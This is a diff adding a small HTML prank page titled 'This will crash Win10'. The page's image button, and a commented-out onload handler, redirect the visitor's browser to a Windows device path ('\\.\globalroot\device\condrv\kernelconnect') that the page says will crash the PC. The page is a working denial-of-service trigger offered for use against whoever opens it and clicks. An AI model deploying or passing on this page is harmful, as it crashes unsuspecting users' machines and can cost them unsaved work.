@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>This will crash Win10</title>
+</head>
+
+<body>
+    <div class="container">
+        <!-- <div class="titlebar"></div>
+        <div class="con2">
+            <h1>Do you want to crash your PC?</h1>
+            <button onclick="redirect()">Click to crash your PC</button>
+        </div> -->
+        <div>
+            <img id="window" src="res/win.png" alt="window">
+            <button onclick="redirect()"><img id="button" src="res/button.png" alt="button"></button>
+        </div>
+
+    </div>
+
+    <div class="textcon">
+        <h3>@MandraSaptak || Ahh Damn.....Ignore the spelling mistakes....this isn't spellbee</h3>
+    </div>
+
+
+
+
+
+
+
+
+    <!-- <body onload="redirect()"> -->
+
+    <script>
+        function redirect() {
+            window.location = "http://\\.\globalroot\device\condrv\kernelconnect";
+        }
+    </script>
+
+
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+        }
+
+        body {
+            background-image: url(https://galshir.com/c/wallpapers/gal-shir-galaxy-jar-wallpaper.jpg);
+            background-repeat: none;
+            background-size: cover;
+        }
+
+        button {
+            background: none;
+            outline: none;
+            border: none;
+        }
+
+
+        h1 {
+            font-family: monospace;
+        }
+
+
+        #window {
+            background: none;
+            z-index: 1;
+        }
+
+        #button {
+            position: relative;
+            left: -180px;
+            bottom: 80px;
+            z-index: 0;
+            cursor: alias;
+        }
+
+        .container {
+            height: 97vh;
+            width: 99vw;
+            display: grid;
+            place-items: center;
+            vertical-align: middle;
+            align-items: center;
+
+            background: none;
+
+            /* background: linear-gradient(to right, #9cecfb, #65c7f7, #0052d4); */
+
+        }
+
+        .container>div {
+            vertical-align: middle;
+            align-items: center;
+        }
+
+        .con2 {
+            padding: 20px;
+            background-color: #d3d3d3;
+            border-radius: 10px;
+        }
+
+        .textcon {
+            position: absolute;
+            bottom: 0%;
+            width: 100%;
+
+            background: rgba(25, 25, 25, 0.25);
+            box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
+            backdrop-filter: blur(4px);
+            -webkit-backdrop-filter: blur(4px);
+
+            color: rgb(235, 235, 235);
+            font-family: monospace;
+
+
+        }
+
+        .textcon>h3 {
+            padding: 5px;
+        }
+    </style>
+</body>
+
+</html>l
